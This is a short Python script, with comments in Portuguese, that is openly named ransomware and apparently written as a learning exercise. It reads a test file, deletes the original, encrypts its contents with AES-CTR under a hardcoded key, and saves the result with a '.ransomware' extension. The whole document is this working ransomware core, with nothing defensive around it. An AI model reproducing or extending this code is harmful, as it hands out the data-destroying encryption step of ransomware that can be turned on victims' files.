import os
import pyaes

# 1- Abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_conteudo = file.read()
file.close()

# 2- Remover o arquivo
os.remove(file_name)

# 3-  Chave de criptografia
key = b"testeransomwares"  # precisa ter acima de 15 caracteres 
aes = pyaes.AESModeOfOperationCTR(key)

# 4-  Criptografar o arquivo
crypto_data = aes.encrypt(file_conteudo)

# 5-  Salvar o arquivo criptografado
new_file = file_name + ".ransomware"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
